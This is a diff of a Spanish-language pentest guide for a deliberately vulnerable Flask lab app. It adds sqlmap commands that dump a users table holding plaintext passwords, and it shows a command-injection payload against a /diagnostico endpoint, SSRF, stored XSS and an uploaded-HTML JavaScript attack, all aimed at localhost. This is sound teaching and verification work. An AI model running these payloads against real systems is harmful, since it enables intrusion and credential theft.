@@ -4,10 +4,12 @@ Como atacar la aplicacion (V1 vulnerable), como se obtuvieron los resultados de
 verificacion de la V2, y los scripts automatizados (SQLi con sqlmap, probes no
 destructivos) incluidos en este repositorio.
 
-> **Estado:** la V1 (P1) esta en proceso de subida; las secciones marcadas
-> `[P1]` requieren los endpoints `/diagnostico` (RCE) y `/importar` (SSRF) y el
-> `|safe` en templates. Los ataques de SQLi funcionan hoy contra la V1 actual.
-> La verificacion de la V2 (seccion 2) esta **ejecutada y verificada**.
+> **Estado:** la V1 (P1) esta **integrada en `v1-insegura`** con RCE
+> (`/diagnostico`), SSRF (`/importar`), XSS real (`|safe`) y `docs/PENTEST.md`.
+> Los ataques de esta guia se reproducen contra `http://localhost:5001`.
+> La verificacion de la V2 (seccion 2) esta **ejecutada y verificada**
+> (PASS=18 FAIL=0). El ataque sqlmap automatizado se ejecuto en vivo y su
+> evidencia esta en `docs/SQLMAP_ATTACK.md`.
 
 ---
 
@@ -240,6 +242,25 @@ Ejecutan tres fases: enumerar bases desde `/login`, volcar `usuarios` desde
 `/login`, y (con cookie de sesion) atacar `/estudiantes?buscar=` y volcar la
 tabla. La evidencia queda en `docs/sqlmap_evidence/`.
 
+**Vía Docker (recomendada, sin instalar nada en el host):**
+
+```bash
+# 1. Levantar la V1 (Flask debug) — la imagen sqlmap queda lista en la red "lab"
+docker compose up -d v1
+
+# 2. Enumerar bases desde /login (POST, sin CSRF en V1)
+docker compose run --rm sqlmap -u "http://v1:5001/login" \
+       --data="username=admin&password=x" \
+       --batch --level=1 --risk=1 --threads=4 --dbs
+
+# 3. Dump de usuarios (credenciales en texto plano) — salida en /out (docs/sqlmap_evidence)
+docker compose run --rm sqlmap -u "http://v1:5001/login" \
+       --data="username=admin&password=x" \
+       --batch --level=1 --risk=1 --threads=4 -D academia -T usuarios --dump
+```
+
+**Vía scripts (sqlmap en el host):**
+
 ```bash
 # Linux / Git Bash
 ./scripts/sqlmap_attack.sh http://localhost:5001
@@ -270,7 +291,7 @@ sqlmap -u "http://localhost:5001/estudiantes" --data="buscar=test" \
 Resultado esperado: `usuarios` con `admin/admin123` y `profesor/profesor` en
 texto plano. Evidencia (`.csv`/`.log`) a adjuntar en `docs/SQLMAP_ATTACK.md`.
 
-### 3.4 RCE — Command Injection `[P1]`
+### 3.4 RCE — Command Injection
 
 Con el endpoint `/diagnostico` de la V1 (concatena el comando con `shell=True`):
 
@@ -280,7 +301,7 @@ curl -s -X POST http://localhost:5001/diagnostico -d "comando=fecha|id"
 # -> salida de whoami/id visible en la respuesta (ejecucion de comandos)
 ```
 
-### 3.5 SSRF `[P1]`
+### 3.5 SSRF
 
 Con el endpoint `/importar` de la V1 (descarga cualquier URL):
 
@@ -302,7 +323,7 @@ curl -s -F "archivo=@payload.html" http://localhost:5001/archivos/subir
 curl -s http://localhost:5001/static/uploads/payload.html    # -> ejecuta JS
 ```
 
-- **Campos sin escapar `[P1]`:** con el `|safe` en templates, inyectar
+- **Campos sin escapar:** con el `|safe` en templates, inyectar
   `<script>` en nombre/email (XSS almacenado).
 
 ### 3.7 CSRF — delete por GET
